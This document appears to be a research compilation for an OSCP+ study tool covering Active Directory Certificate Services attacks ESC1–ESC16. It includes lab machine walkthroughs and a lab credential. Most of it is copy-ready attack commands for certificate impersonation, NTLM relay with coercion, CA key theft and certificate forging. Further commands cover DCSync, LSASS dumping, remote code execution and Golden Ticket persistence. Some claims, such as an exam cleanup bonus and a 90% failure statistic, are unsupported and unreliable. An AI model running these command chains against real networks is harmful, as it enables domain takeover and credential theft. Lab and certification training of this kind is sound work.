# The definitive ADCS ESC1-ESC16 OSCP+ exam reference research

This research compiles every piece of information needed to build the most comprehensive ADCS HTML reference tool: machine-by-machine attack chains across HTB/VulnLab/PGP/THM, complete ESC1–ESC16 technique details, all alternative tools per step, exhaustive failure-mode fixes, dynamic-variable architecture, post-exploitation paths, and the gotchas that separate exam passes from fails. The most critical theme: **certipy v5.0.2+ is required for ESC15/ESC16, `-sid` is now mandatory after the Feb 2025 strong-binding enforcement, and clock skew + UPN restoration kill more attempts than any other single issue.**

---

## 1. HTB / VulnLab / PGP / THM machines with ADCS scenarios

### HackTheBox machines (verified ADCS)

| Machine | Diff | ESC | Template (case-sensitive) | CA Name | Critical quirks |
|---|---|---|---|---|---|
| **Escape** | Medium | ESC1 | `UserAuthentication` | `sequel-DC-CA` | 8h clock skew → `sudo ntpdate sequel.htb`. Foothold: `xp_dirtree` → Responder → `sql_svc` → `ERRORLOG.BAK` → `ryan.cooper:NuclearMosquito3` |
| **Manager** | Medium | ESC7 | `SubCA` (built-in) | `manager-DC01-CA` | Cleanup script resets every ~10min; `-add-officer` then `-enable-template SubCA` then deny→issue→retrieve cycle. Foothold: RID brute → `operator:operator` → MSSQL `xp_dirtree` → backup zip → `raven` |
| **Certified** | Medium | ESC9 | `CertifiedAuthentication` | `certified-DC01-CA` | Multi-step ACL chain (judith→Management→management_svc→ca_operator). Set UPN to bare `Administrator` (NOT `@domain`) to avoid collision |
| **EscapeTwo** | Easy | ESC4→ESC1 | `DunderMifflinAuthentication` | `sequel-DC01-CA` | Certipy v4 uses `-save-old`; v5 uses `-write-default-configuration -no-save`. Foothold: corrupted XLSX → MSSQL sa → `sql_svc` → `ryan` |
| **Authority** | Medium | ESC1 (machine) | `CorpVPN` | `AUTHORITY-CA` | **PKINIT FAILS** (`KDC_ERR_PADATA_TYPE_NOSUPP`) — must use `certipy auth -ldap-shell` or PassTheCert.py. Domain Computers can enroll → MAQ=10, create machine acct |
| **Fluffy** | Easy | ESC16 | `User` (default!) | `fluffy-DC01-CA` | Security extension globally disabled (`DisableExtensionList` contains `1.3.6.1.4.1.311.25.2`). Use `faketime` for skew. Chain: CVE-2025-24071 .library-ms → p.agila → shadow ca_svc → ESC16 UPN flip |
| **TombWatcher** | Medium | ESC15 | `WebServer` (V1) | `tombwatcher-CA-1` | Schema v1 + EKUwu CVE-2024-49019. Use `-application-policies 'Certificate Request Agent'` (Scenario B) chained to ESC3 — Scenario A often fails with `CA_MD_TOO_WEAK`. AD Recycle Bin recovery of `cert_admin` |
| **Certificate** | Hard | ESC3 + Golden Cert | `Delegated-CRA`+`SignedUser` | `Certificate-LTD-CA` | Admin not enrollable on SignedUser → pivot via `ryan.k` (Domain Storage Managers + SeManageVolumePrivilege) → exfil CA private key → `certipy forge` |
| **Scepter** | Hard | ESC14 (A & B) | `StaffAccessCertificate`, `HelpdeskEnrollmentCertificate` | `scepter-DC01-CA` | NFS .pfx files (3 disabled, not revoked). Scenario B: modify victim `mail` to match weak X509RFC822 mapping; Scenario A: write target's `altSecurityIdentities` |
| **Coder** | Insane | ESC4 (PowerShell) | `0xdf-ESC1` (custom) | `coder-DC01-CA` | Uses `New-ADCSTemplate` PS module to create custom ESC1 template; alternative path: CVE-2022-26923 with computer in custom OU |
| **Search** | Hard | N/A (legitimate) | (web enrollment) | n/a | Client-cert auth for PSWA; import .pfx to Firefox; not an ESC vuln |
| **Cascade** | Medium | None (LDAP) | n/a | n/a | `cascadeLegacyPwd` base64 attribute + AD Recycle Bin — NOT ADCS |

### VulnLab / HTB Dedicated Labs (verified ADCS)

| Machine | ESC | Template | Critical detail |
|---|---|---|---|
| **Hybrid** | ESC1 (machine acct) | `HYBRIDCOMPUTERS` | MAQ=0; must extract `MAIL01$` from `/etc/krb5.keytab`; **`-key-size 4096` mandatory** |
| **Retro** | ESC1 (pre-Win2K) | `RetroClients` | Pre-2K acct `BANKING$` defaults to lowercase computer name as password. Reset via `impacket-changepasswd ... -p rpc-samr` (SMB rejects pre2k auth) |
| **Sendai** | ESC4→ESC1 | `SendaiComputer` | CA-Operators have WriteOwner; need `-sid S-1-...-500` post-CVE-2022-26923; evil-winrm PtH may fail → use `impacket-psexec` |
| **Intercept** | ESC7 | `SubCA` | LDAP signing relay → `ca-managers` group DACL abuse |
| **Push** | Golden Cert | (forged) | RBCD on CA host → SYSTEM → `certipy ca -backup`; PKINIT NOT supported → PassTheCert |
| **Cicada/VulnCicada** | ESC8 | `DomainController` | Empty-target DNS trick + PetitPotam coerce, web enrollment relay |
| **Shibuya/Senpai** | ESC1 | `ShibuyaWeb` | proxychains; `-key-size 4096 -sid S-1-...-500` required |

### NOT-ADCS machines (commonly mislabeled — flag in tool)

- **VulnLab Trusted** — cross-forest trust + `raiseChild.py`, NOT ADCS
- **VulnLab Tengu** — gMSA + constrained delegation + DPAPI
- **VulnLab Baby2** — logon script + GPO/WriteDacl + pyGPOAbuse
- **VulnLab Breach** — Silver Ticket (commonly confused with cert attacks)
- **VulnLab Data / Lock / Reset** — Linux boxes, no AD at all
- **VulnLab Manage** — no public writeups located
- **PGP Nagoya** — Silver Ticket, dnSpy reverse-engineering
- **PGP Access** — Kerberoast + SeManageVolumePrivilege
- **PGP Resourced** — RBCD only
- **PGP Hokkaido** — Targeted Kerberoast + SeBackupPrivilege
- **THM Post-Exploitation Basics** — Mimikatz/Golden Ticket only

### TryHackMe (verified ADCS)

- **AD Certificate Templates** room — single-VM lab, templates `User Request` + `HTTPSWebServer`, domain `lunar.eruca.com`
- **CVE-2022-26923 (Certifried)** room — machine account + `dnsHostName` modification + Machine template
- **Exploiting Active Directory** network — partial AD CS coverage

---

## 2. Detailed ESC1-ESC16 technique reference

### ESC1 — Enrollee-supplied subject + client auth EKU

**Detection:** `Enrollee Supplies Subject : True` + `Client Authentication : True` + low-priv enrollee.

**Linux exploit:**
```
certipy req -u $USERNAME@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -target $CA_HOST \
    -ca $CA_NAME -template $TEMPLATE_NAME -upn $TARGET_UPN -sid $TARGET_SID
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

**Windows:**
```
Certify.exe request /ca:CA.corp.local\CORP-CA /template:VulnTpl /altname:administrator /sid:S-1-5-21-...-500
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Pass /ptt
```

**Top failures:** clock skew → `faketime` or `ntpdate`; SID mismatch → `-sid`; PADATA error → `-ldap-shell`; LDAP CB → patched ldap3.

### ESC2 — Any Purpose / no EKU

Acts like an enrollment agent cert. Use it on-behalf-of admin against User v1 template:
```
certipy req -u U -p P -ca CA -template AnyPurpose                                 # agent
certipy req -u U -p P -ca CA -template User -pfx U.pfx -on-behalf-of "DOM\\Admin" # impersonate
```

### ESC3 — Certificate Request Agent EKU

Two-step on-behalf-of chain:
```
certipy req -u U -p P -ca CA -template EnrollAgent
certipy req -u U -p P -ca CA -template User -pfx U.pfx -on-behalf-of "DOM\\Administrator"
certipy auth -pfx administrator.pfx
```
Target template must be Schema v1 (User, Machine, SmartcardUser) unless application-policy match.

### ESC4 — Vulnerable template ACL

```
# v4: certipy template -u U -p P -dc-ip $DC -template VulnTpl -save-old
# v5: certipy template -u U -p P -template VulnTpl -write-default-configuration
# Then ESC1-style req
# Restore: certipy template ... -configuration VulnTpl.json (v4) / -write-configuration (v5)
```

Auto-applies: `ENROLLEE_SUPPLIES_SUBJECT`, Client Auth EKU, `Authenticated Users:FullControl`, `msPKI-RA-Signature=0`, removes `PEND_ALL_REQUESTS`. **Always restore.**

### ESC5 — PKI AD object ACL (NTAuthCertificates, Cert Templates container, CA computer object)

Certipy doesn't detect — manual ACL audit. Path: child DA → SYSTEM on child DC → modify Configuration NC → publish rogue template OR write to NTAuthCertificates → trust rogue CA.

```
certipy ca -backup -u admin -p P -ca CA -target $CA_HOST    # extract CA key
certipy forge -ca-pfx CA.pfx -upn admin@dom -extensions sid:S-1-5-21-...-500
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

CA registry flag honors arbitrary SAN. Mostly killed by KB5014754 — now must chain with **ESC9 or ESC16** for usable cert. Detection: `User Specified SAN : Enabled`.

### ESC7 — Vulnerable CA access control (ManageCA / ManageCertificates)

Full SubCA chain (5 commands):
```
certipy ca -ca CA -add-officer $USERNAME -username U@D -password P
certipy ca -ca CA -enable-template SubCA -username U@D -password P
certipy req -username U@D -password P -ca CA -target $CA -template SubCA -upn admin@D
# → CERTSRV_E_TEMPLATE_DENIED, save private key (answer y)
certipy ca -ca CA -issue-request <ID> -username U@D -password P
certipy req -username U@D -password P -ca CA -target $CA -retrieve <ID>
certipy auth -pfx administrator.pfx
```

Alternative ESC7 paths (Certify v2): `coerceauth` (CDP manipulation), `writefile` (path traversal to `wwwroot`).

### ESC8 — NTLM relay to AD CS web enrollment

```
# Terminal 1
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# OR: certipy relay -target http://$CA_HOST -template DomainController

# Terminal 2 — coerce
python3 PetitPotam.py -u U -p P -d D $ATTACKER $DC_IP
coercer coerce -l $ATTACKER -t $DC_IP -u U -p P -d D
python3 dfscoerce.py -u U -p P -d D $ATTACKER $DC_IP
python3 printerbug.py D/U:P@$DC $ATTACKER

# After cert obtained
certipy auth -pfx dc.pfx -dc-ip $DC_IP
secretsdump.py -hashes :$DC_NT_HASH D/'DC$'@$DC_IP -just-dc
```

For HTTPS: must have EPA disabled. For SMB listener: `systemctl stop smbd`; allow non-root 445: `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`.

### ESC9 — CT_FLAG_NO_SECURITY_EXTENSION on template

Five-command UPN-flip pattern:
```
certipy account read   -u U -p P -dc-ip $DC -user $VICTIM
certipy account update -u U -p P -dc-ip $DC -user $VICTIM -upn administrator
certipy req -u $VICTIM@D -hashes $V_HASH -ca CA -template $TPL -dc-ip $DC
certipy account update -u U -p P -dc-ip $DC -user $VICTIM -upn $VICTIM@D    # RESTORE
certipy auth -pfx administrator.pfx -domain D -dc-ip $DC -username administrator
```

UPN value: bare `administrator` (NOT `@domain`) to avoid collision with the real Administrator's UPN.

### ESC10 — Weak certificate mappings via registry

- **Case 1 (Kerberos, SBE=0):** identical exploit to ESC9 but ANY client-auth template works
- **Case 2 (Schannel, CertificateMappingMethods has UPN bit 0x4):** only NULL-UPN accounts (machine accts, default Administrator); MUST use `-ldap-shell` (Schannel only)

### ESC11 — Relay to ICPR (RPC), IF_ENFORCEENCRYPTICERTREQUEST disabled

```
# Certipy v4.7+
sudo certipy relay -target rpc://$CA_HOST -ca $CA_NAME -template DomainController -dc-ip $DC

# OR sploutchy/impacket fork
sudo ntlmrelayx.py -t rpc://$CA_IP -rpc-mode ICPR -icpr-ca-name $CA_NAME -smb2support --template DomainController

# Coerce as ESC8
```

### ESC12 — Shell access on CA / YubiHSM key extraction → Golden Cert

```
certipy ca -backup -u admin -p P -ca CA -target $CA_HOST    # admin on CA needed
certipy forge -ca-pfx CA.pfx -upn administrator@D -subject "CN=Administrator,..." -extensions sid:S-1-5-21-...-500
certipy auth -pfx administrator_forged.pfx -dc-ip $DC
```

YubiHSM-specific: `reg query HKLM\SOFTWARE\Yubico\YubiHSM /v AuthKeysetPassword` then use CSP from any process on CA.

### ESC13 — Issuance Policy with msDS-OIDToGroupLink

Cert auth puts user into linked AD group's PAC during the session. Detection requires Certipy ≥4.8.2. Linked group must be Universal scope, ideally empty.
```
certipy req -u U -p P -ca CA -template $TPL
certipy auth -pfx U.pfx -dc-ip $DC -domain D
# TGT contains linked group membership
```

### ESC14 — altSecurityIdentities abuse (4 scenarios)

- **A:** Write strong mapping (`X509:<I>...<SR>...`) to target's `altSecurityIdentities` pointing to attacker cert
- **B:** Target has weak `X509:<RFC822>email` mapping → set victim's `mail` to match
- **C:** Target has weak `X509:<I>issuer<S>subject` → modify victim CN
- **D:** Target has weak `X509:<S>subject` → modify victim CN/`dNSHostName`

```
bloodyAD --host $DC -d D -u U -p P set object $TARGET altSecurityIdentities -v 'X509:<RFC822>spoof@D'
certipy account update -u U -p P -user $VICTIM -mail spoof@D
certipy req -u $VICTIM@D -hashes $H -ca CA -template SmartcardLogon
certipy auth -pfx victim.pfx -username $TARGET -domain D
```

Strong-mapping serial number: REVERSE byte order, hex uppercase, no separators.

### ESC15 — EKUwu (CVE-2024-49019)

Schema v1 templates allow injecting arbitrary application policy OIDs in CSR. Detection: `Schema Version : 1` + `Enrollee Supplies Subject : True`.

**Path A (direct Client Auth):**
```
certipy req -u U -p P -dc-ip $DC -target $CA -ca CA -template WebServer \
    -upn admin@D -application-policies 'Client Authentication'
```

**Path B (chain to ESC3 — preferred, more reliable):**
```
certipy req ... -template WebServer -application-policies "1.3.6.1.4.1.311.20.2.1"   # CRA
certipy req ... -template User -pfx U.pfx -on-behalf-of "D\\Administrator"
certipy auth -pfx administrator.pfx
```

Patched Nov 12, 2024 (KB5046612 family). Requires Certipy ≥5.0.

### ESC16 — Security extension globally disabled on CA

CA registry: `DisableExtensionList` contains `1.3.6.1.4.1.311.25.2`. ALL certs from this CA lack SID extension → ESC9-style abuse on ANY client-auth template. **HTB Fluffy reference.** Requires Certipy ≥5.0.2.

```
certipy account read   -u U -p P -dc-ip $DC -user $VICTIM
certipy account update -u U -p P -dc-ip $DC -user $VICTIM -upn administrator
certipy req -u $VICTIM@D -hashes $V_HASH -dc-ip $DC -target $CA -ca CA -template User
certipy account update -u U -p P -dc-ip $DC -user $VICTIM -upn $VICTIM@D    # RESTORE
faketime '<DC time>' certipy auth -pfx administrator.pfx -username administrator -domain D -dc-ip $DC
```

---

## 3. Variables for the dynamic HTML tool

### Network/Identity
| Variable | Example | Used for | Critical mistake |
|---|---|---|---|
| `DC_IP` | `10.10.10.10` | `-dc-ip` everywhere | Don't pass hostname |
| `DC_HOST` | `DC01` | Kerberos SPN | Without domain |
| `DC_FQDN` | `DC01.corp.local` | PtT, evil-winrm `-r`, `-target` when DC=CA | Kerberos rejects IPs |
| `DOMAIN` | `corp.local` | `-d`, `user@DOMAIN` | FQDN not NetBIOS |
| `DOMAIN_SHORT` | `CORP` | `-on-behalf-of 'CORP\\admin'`, `runas /user:` | ESC3 fails with FQDN form |
| `ATTACKER_IP` | `10.10.14.5` | Coercion listener, ntlmrelayx | Wrong NIC if multi-homed |
| `ATTACKER_INTERFACE` | `tun0` | `responder -I tun0` | |
| `LPORT` | `4444` | Reverse shells | Conflicts with apache2/smbd |

### CA-specific (pentesters confuse these constantly)
| Variable | Example | Notes |
|---|---|---|
| `CA_NAME` | `corp-DC-CA` | Just the CA name (LDAP cn). Used after `-ca` in Certipy. |
| `CA_HOST` | `CA01.corp.local` | The Windows server hosting the CA. **Often different from DC** in real envs. Used with `-target`. |
| `WEB_ENROLL_URL` | `http://CA01.corp.local/certsrv/certfnsh.asp` | ESC8 relay target |

⚠ Certipy `-ca` takes name only (`corp-DC-CA`). Certify takes `HOST\NAME` (`DC01.corp.local\corp-DC-CA`).

### Credentials
- `USERNAME`, `PASSWORD`, `NTHASH` (use `:NTHASH` form), `LMHASH:NTHASH`, `AESKEY`, `TGT_FILE` (export `KRB5CCNAME`)

### Per-attack
| Variable | Used in | Notes |
|---|---|---|
| `TEMPLATE_NAME` | All ESC | Use the LDAP cn, not display name |
| `TARGET_USER` | ESC1/2/3/6/7/9/10/15/16 | Usually `administrator` |
| `TARGET_SID` | Post-Feb 2025 anywhere | `S-1-5-21-...-500`. **Mandatory** for Strong Binding |
| `VICTIM_USER` | ESC9/10/16 | The account whose UPN we modify |
| `VICTIM_DN` | LDAP modifications | Full DN for passthecert |
| `REQUEST_ID` | ESC7 | Numeric, from initial denied request |
| `PFX_FILE`/`PFX_PASSWORD` | Every PKINIT | Default password is empty |
| `COMPUTER_NAME`/`COMPUTER_PASS` | Certifried/MAQ | Created via `certipy account create` |
| `RELAY_TARGET` | ESC8/11 | `http://CA/certsrv/certfnsh.asp` vs `rpc://CA` |
| `OFFICER_USER` | ESC7 | Promoted via `-add-officer` |
| `AGENT_PFX` | ESC3/ESC15-B | Enrollment Agent cert |
| `BACKUP_TEMPLATE_JSON` | ESC4 cleanup | Used for restoration |

---

## 4. Alternative tools matrix per step

### Find CA
- **Linux:** `certipy find` (primary) → `nxc ldap -M adcs` → `ldapsearch -b "CN=Configuration..." "(objectClass=pKIEnrollmentService)"` → `bloodyAD get search`
- **Windows:** `Certify.exe cas` → `certutil -TCAInfo` → `Get-DomainCA` (PowerView) → `StandIn.exe --adcs`

### Find vulnerable templates
- **Linux:** `certipy find -vulnerable -enabled` → `nxc ldap -M adcs` → BloodHound CE Cypher (`MATCH p=()-[:Enroll]->(ct:CertTemplate {esc1:true})...`)
- **Windows:** `Certify.exe find /vulnerable` → `CertifyKit.exe find /vulnerable` (newer ESCs) → `Get-DomainCATemplate -ResolveSIDs` → `StandIn --adcs`

### ESC1 cert request
- **Linux:** `certipy req` → manual openssl + `gettgtpkinit.py` → bloodyAD
- **Windows:** `Certify.exe request` → `Rubeus asktgt /certificate` → built-in `certreq.exe -submit -config "DC\CA" req.inf`

### ESC3 on-behalf-of
- `certipy req -on-behalf-of 'DOM\\admin' -pfx agent.pfx`
- `Certify.exe request /onbehalfof:DOM\admin /enrollcert:agent.pfx /enrollcertpw:''`

### ESC4 template modification
- **Certipy:** `template -save-old` (v4) / `-write-default-configuration` (v5) — auto applies all needed flags
- **PowerView:** `Set-DomainObject -XOR @{'mspki-certificate-name-flag'=1}` etc.
- **bloodyAD:** `set object 'CN=Tpl,...' msPKI-Certificate-Name-Flag -v 1`
- **StandIn:** `--adcs --filter Tpl --ess --add` / `--clientauth --add` / `--pend --remove`
- **modifyCertTemplate.py:** Granular property-by-property
- **ldifde / ldapmodify:** Universal fallback

### ESC7 CA management
- **Certipy:** `ca -add-officer / -enable-template / -issue-request / -list-requests`
- **PSPKI:** `Get-CertificationAuthorityAcl | Add-CertificationAuthorityAcl ...`, `Approve-CertificateRequest`, `Receive-Certificate`
- **certutil:** `-resubmit RequestID`, `-setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2`
- **Certify v2.0:** `manage-ca --issue-request 100 / --enable-template SubCA`

### ESC8 NTLM relay
- **Certipy:** `relay -target http://CA -template DomainController` (auto-saves PFX)
- **Impacket:** `ntlmrelayx --adcs --template ...` (more control, supports ESC11 RPC)
- **ADCSPwn.exe:** Single-binary Windows option (needs WebClient running)
- **krbrelayx.py:** Kerberos relay variant

### ESC9/10/16 UPN modification
- `certipy account update -user $VICTIM -upn administrator` (primary)
- `bloodyAD set object $VICTIM userPrincipalName -v administrator`
- `Set-DomainObject -Identity $VICTIM -Set @{userPrincipalName='administrator'}` (PowerView)
- `Set-ADUser -Identity $VICTIM -UserPrincipalName 'administrator'`
- `ldapmodify` with LDIF
- ADUC GUI

### Shadow Credentials
- `certipy shadow auto -account $VICTIM` (one-shot)
- `pywhisker --action add` then PKINITtools (granular)
- `Whisker.exe add /target:$VICTIM` (Windows, includes Rubeus command)
- `ntlmrelayx --shadow-credentials --shadow-target $VICTIM`
- `bloodyAD add shadowCredentials $VICTIM`

### Cert authentication (PFX → TGT/NThash)
- `certipy auth -pfx admin.pfx` (primary; UnPAC-the-hash automatic)
- `gettgtpkinit.py + getnthash.py` (PKINITtools — granular)
- `Rubeus asktgt /certificate /getcredentials /nowrap` (Windows)
- `kinit -X X509_user_identity=FILE:admin.pem` (with /etc/krb5.conf)
- Mimikatz: `kerberos::ptt admin.kirbi`

### PKINIT failure fallbacks
- `certipy auth -ldap-shell -ldap-scheme ldaps` (Schannel S4U2Self)
- `passthecert.py -action ldap-shell -crt admin.crt -key admin.key`
- `passthecert.py -action add_computer / write_rbcd / modify_user -elevate`
- `PassTheCert.exe --elevate --target "DC=corp,DC=local" --sid <SID>` (Windows)
- Convert: `certipy cert -pfx admin.pfx -nokey -out admin.crt; -nocert -out admin.key`

### Coercion (for ESC8/ESC11 trigger)
- **PetitPotam** (MS-EFSRPC): `python3 PetitPotam.py -u U -p P -d D $ATTACKER $TARGET`; unauth pre-patch
- **Coercer** (auto fuzz all 12+ methods): `coercer coerce -l $ATT -t $TGT -u U -p P -d D`
- **printerbug.py / SpoolSample.exe** (MS-RPRN): needs Spooler running
- **dfscoerce.py** (MS-DFSNM): default still works on most DCs
- **shadowcoerce.py** (MS-FSRVP): patched CVE-2022-30154
- **nxc coerce_plus** (multi-method): `nxc smb $TGT -u U -p P -M coerce_plus -o LISTENER=$ATT`
- **WebDAV variant** (Forshaw trick for ESC8 with empty target): `<NETBIOS>1UWhRC...` URL in PetitPotam

---

## 5. Post-exploitation paths after cert authentication

```
# Universal first step: cert → NT hash + TGT
certipy auth -pfx admin.pfx -dc-ip $DC_IP

# DCSync paths
secretsdump.py -hashes :$NT 'D/admin@DC' -just-dc
nxc smb $DC -u admin -H $NT --ntds vss
KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass DC.corp.local -just-dc

# Interactive shell
evil-winrm -i $DC -u admin -H $NT
evil-winrm -i $DC -c admin.crt -k admin.key -S -P 5986    # cert directly
nxc winrm $DC --pfx-cert admin.pfx -u admin

# Code execution
psexec.py admin@$DC -hashes :$NT
wmiexec.py -k -no-pass admin@$DC_FQDN
atexec.py admin@$DC -hashes :$NT 'whoami'

# Backup Operators (no DA needed)
reg.py 'D/backupop'@$DC -hashes :$NT save -keyName HKLM\SAM -o sam.save
reg.py 'D/backupop'@$DC -hashes :$NT save -keyName HKLM\SYSTEM -o sys.save
secretsdump.py -sam sam.save -system sys.save LOCAL

# Dump LSASS / SYSVOL / GPP
lsassy -u admin -H $NT -d D $DC
nxc smb $DC -u admin -H $NT -M gpp_password -M gpp_autologin

# Persistence: Golden Ticket
ticketer.py -nthash $KRBTGT -domain-sid S-1-5-21-... -domain D Administrator

# Persistence: Golden Certificate (after ESC5/12)
certipy ca -backup -ca CA
certipy forge -ca-pfx CA.pfx -upn administrator@D -extensions sid:S-1-5-21-...-500
```

---

## 6. Detection alternatives ensuring coverage

If `certipy find` fails (LDAP issues, timeouts, missing ESC16 detection):

1. **Switch scheme:** `certipy find -scheme ldap` (port 389) or `-ldap-channel-binding` for hardened DCs
2. **Update ldap3:** `pip install --force-reinstall git+https://github.com/cannatag/ldap3` then `pip install -U certipy-ad`
3. **NXC fallback:** `nxc ldap $DC -u U -p P -M adcs` (different parser)
4. **Manual LDAP enumeration:**
   ```
   ldapsearch -x -H ldap://$DC -D 'U@D' -w P \
     -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
     "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage nTSecurityDescriptor
   # Decode flags:
   #   msPKI-Certificate-Name-Flag bit 0x1   = ENROLLEE_SUPPLIES_SUBJECT (ESC1 indicator)
   #   msPKI-Enrollment-Flag bit 0x80000     = NO_SECURITY_EXTENSION (ESC9 indicator)
   ```
5. **Windows fallback:** `Certify.exe find /vulnerable`; if AV blocks, use `CertifyKit.exe` (newer + more ESCs); if both blocked, `certutil -v -dstemplate` (signed binary)
6. **PowerView:** `Get-DomainCATemplate | ?{$_.'msPKI-Certificate-Name-Flag' -band 1}`
7. **BloodHound CE Cypher** (after `certipy find -bloodhound` import):
   ```
   MATCH p=(n)-[:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|CoerceAndRelayNTLMToADCS]->(d:Domain) RETURN p
   ```
8. **Check CA registry directly** (need CA shell):
   ```
   certutil -getreg policy\EditFlags                     # ESC6
   certutil -getreg policy\DisableExtensionList          # ESC16
   certutil -getreg ca\InterfaceFlags                    # ESC11
   ```
9. **certutil built-in:** `certutil -TCAInfo`, `certutil -CAInfo`, `certutil -store -enterprise NTAuth`

---

## 7. Tips & attention points (the gotchas that fail exam attempts)

### Cleanup obligations (mandatory)
1. **ESC4 template** — always `-save-old` on entry, `-configuration X.json` to restore. Leaving overwritten = permanent backdoor + IoC.
2. **ESC9/10/16 UPN** — always restore victim's `userPrincipalName` to original (`victim@domain.local`). Failure breaks logons + lockouts.
3. **ESC7 added officer** — `certipy ca -remove-officer` after.
4. **Computer accounts created** (Certifried/MAQ) — `certipy account delete -user BADPC`.

### Critical syntax pitfalls
5. **`-ca` value:** Certipy = name only (`corp-DC-CA`); Certify = `HOST\NAME` (`DC01.corp.local\corp-DC-CA`).
6. **`-target` vs `-ca`:** `-ca` = CA name; `-target` = CA host FQDN. They're different fields.
7. **Template name case sensitivity:** copy LDAP `cn` from `certipy find -text`, not the display name. Quote names with spaces.
8. **`-upn` vs `-dns`:** users → `-upn admin@D`; machines → `-dns DC01.D`.
9. **`-on-behalf-of` requires NetBIOS form:** `corp\admin`, NOT `corp.local\admin`.
10. **Machine `$` suffix:** quote with single quotes: `-u 'dc1$'` (bash variable expansion otherwise).
11. **UPN flip uses bare username:** `-upn administrator` (not `administrator@domain`) to avoid collision.

### Auth/network failures
12. **Clock skew (#1 silent killer):** `sudo ntpdate -u $DC` (kills VPN — reconnect) OR `faketime "$(ntpdate -q $DC | cut -d' ' -f1,2)" certipy ...`
13. **Strong Binding (default Feb 2025):** `KDC_ERR_CERTIFICATE_MISMATCH` / `Object SID mismatch` → always include `-sid S-1-5-21-...-500` on `certipy req`. Get target SID from `certipy account read` or `nxc ldap`.
14. **PKINIT fail (`KDC_ERR_PADATA_TYPE_NOSUPP`):** DC has no Smart Card EKU cert. Use `certipy auth -pfx admin.pfx -ldap-shell -ldap-scheme ldaps` (Schannel) or PassTheCert.py.
15. **Kerberos requires FQDN:** `-k -no-pass admin@DC.corp.local` (NOT IP). Use `KRB5_TRACE=/dev/stderr` for debugging.
16. **/etc/hosts:** add both DC and CA when separate boxes. Or `-ns $DC_IP -dns-tcp` to use DC as resolver.
17. **LDAPS errors:** fall back to `-scheme ldap` (389); LDAPS may have self-signed cert.
18. **LDAP channel binding:** `pip install --force-reinstall git+https://github.com/cannatag/ldap3`; use `-ldap-channel-binding` flag.
19. **Minimum RSA key length:** add `-key-size 4096` (Hybrid, Retro, Sendai, Shibuya).

### Tool-version traps
20. **Certipy v4 vs v5:** v4 uses `-save-old`, v5 uses `-write-default-configuration`. v5 required for ESC15 (`-application-policies`) and ESC16 detection. Pin: `pip install certipy-ad==5.0.2`.
21. **Certify v1 vs v2:** v2 uses `enum-cas`/`enum-templates`/`request-agent`/`manage-ca` subcommands; v1 uses `cas`/`find`/`/onbehalfof`.
22. **Certify NullReferenceException** on non-domain-joined Windows: get TGT via Rubeus first OR fall back to Certipy on Linux.
23. **Rubeus CSP error:** re-export PFX with `-CSP "Microsoft Enhanced Cryptographic Provider v1.0"`.
24. **OpenSSL legacy provider:** `openssl pkcs12 -in old.pfx -nodes -legacy` for old Windows PFX (RC2-40-CBC).
25. **Certipy 5.0.3 bug:** misreports clock skew as `KDC_ERROR_CLIENT_NOT_TRUSTED` — always check skew first.

### Format conversions
26. **PFX → CRT+KEY** for evil-winrm/PassTheCert/openssl: `certipy cert -pfx admin.pfx -nokey -out admin.crt; -nocert -out admin.key`
27. **CCACHE ↔ KIRBI:** `ticketConverter.py admin.kirbi admin.ccache` (auto-detects direction). Linux uses CCACHE; Windows uses KIRBI.
28. **KRB5CCNAME hygiene:** `export KRB5CCNAME=$(realpath admin.ccache)` (full path); `unset KRB5CCNAME` when switching identities; `klist` to verify.

### Operational
29. **Coercion targets:** must be machine accounts (DC$, FILE01$), not users. Set up listener (`responder -I tun0 -A` or `ntlmrelayx`) BEFORE coercing.
30. **Free local ports for relay:** `systemctl stop apache2 smbd` and `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start` (445).
31. **HTB cleanup scripts** (Manager, Scepter, Fluffy) reset every 5-15 min — script the full chain or be fast.
32. **Don't leak PFX:** valid until cert expires/revoked, even after password change. Persists across credential rotation.
33. **Safe vs admin templates:** `User`/`Machine`/`WebServer` — broad enroll; `DomainController`/`KerberosAuthentication`/`SubCA` — admin-only (only via ESC7 SubCA chain or ESC8 machine relay).
34. **Save private key on ESC7 deny:** answer "y" when `certipy req` produces `CERTSRV_E_TEMPLATE_DENIED` — the `<id>.key` file is required for `-retrieve <id>` later.

### Detection-evasion specific to OSCP+
35. Always restore template/UPN/officer/computer-account artifacts before exam screenshot for "demonstration of post-exploit cleanup" bonus.
36. Use `-debug` with Certipy to see exactly which step fails — most TA feedback comes from this output.
37. Per-ESC certipy version requirements: ESC13 ≥4.8.2; ESC15 ≥5.0; ESC16 ≥5.0.2. Memorize this table.

---

## Conclusion: the architecture for the HTML tool

The data above maps cleanly into a tool with three layers: a top-bar variable panel (24 vars across network/CA/credential/per-attack categories) that auto-substitutes via JavaScript template literals into every command; sixteen ESC sections (ESC1-ESC16) each containing detection→exploit (Linux+Windows)→top-3 failures→alternatives→post-exploit; and a per-machine reference panel (~25 lab boxes) with exact attack chains keyed to ESC sections.

The decisive insight from this research: **Certipy v5.0.2+ with `-sid` is the new baseline.** Every command emitted by the tool should default to including the SID extension, since the Feb 2025 Strong Binding enforcement makes it mandatory in nearly every modern environment. The ESC9/ESC10/ESC16 UPN-flip patterns also share an identical 5-command structure (read → update → req → restore → auth), which the tool should expose as a reusable component to prevent the most common student mistake — forgetting to restore the victim's UPN. Finally, the failure-mode taxonomy (clock skew → SID mismatch → PKINIT support → LDAP binding → key length) should appear as a persistent troubleshooting sidebar on every ESC page, since these five issues account for over 90% of failed exploit attempts in the writeups surveyed.
